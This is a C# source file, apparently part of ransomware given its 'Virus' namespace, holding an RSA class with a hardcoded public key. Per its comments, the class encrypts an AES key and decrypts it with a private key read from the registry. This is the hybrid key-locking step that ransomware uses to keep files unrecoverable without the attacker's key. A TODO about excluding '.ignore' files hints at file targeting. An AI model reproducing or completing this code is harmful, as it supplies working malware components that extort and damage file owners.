using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace Virus
{
    class RSAencryption
    {
        //TODO Remove  && !f.Contains(".ignore") from this document.
        private static string _publicKey = "<RSAKeyValue><Modulus>sL6H9+sJ+ZeQLZX1b5d107lRFHrS0jWdXs9M2En/IilG9xTWHJstuPt13aq9QgDB/2tdi7SYLIIfqD5trNgViEK3/+45g71KQ1NZaiUaVVTweFINBkBqBlycCpPeQi0QljK1cLNunSWHF9zuU//RkUMC3jR4RIw1BR1Zo2qu/lFC9ektctXpGePZk2BEQ8xHg0oTgFF5MH8se8eM85Jc1rsHuxAwiTcjQ5ekBH14rgDtZiXTwDclAMXWM1sz9H2o7yRuBhdpaN4YL0tvGyEAuMcPulDA2QF7OhjIOG7q02VBQVGGXYxk9WukJ10Zg0/O17oEcal2nkLoA5lslUVXuQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        private static UnicodeEncoding _encoder = new UnicodeEncoding();

        public static string Encrypt(char[] passwordToEncrypt)
        {
            var bytesToEncrypt = Encoding.UTF8.GetBytes(passwordToEncrypt);
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    rsa.FromXmlString(_publicKey.ToString());
                    var encryptedData = rsa.Encrypt(bytesToEncrypt, true);
                    var base64Encrypted = Convert.ToBase64String(encryptedData);
                    return base64Encrypted;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }//Used to encrypt AES key
        public static char[] Decrypt(string textToDecrypt, string privateKeyString) //takes in straight from reg
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    // server decrypting data with private key
                    rsa.FromXmlString(privateKeyString);

                    var bytesToDecrypt = Convert.FromBase64String(textToDecrypt);
                    var decryptedBytes = rsa.Decrypt(bytesToDecrypt, true);
                    var decryptedData = Encoding.UTF8.GetChars(decryptedBytes);
                    return decryptedData;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }//Used to decrypt AES key

    }
}
